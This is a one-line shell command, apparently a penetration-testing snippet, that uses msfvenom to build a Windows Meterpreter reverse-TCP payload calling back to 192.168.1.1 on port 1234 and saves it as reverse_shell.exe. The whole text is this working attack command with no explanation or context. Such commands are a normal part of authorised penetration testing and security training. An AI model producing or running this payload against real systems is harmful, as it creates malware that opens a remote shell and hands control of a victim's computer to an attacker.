msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=1234 -f exe -o reverse_shell.exe

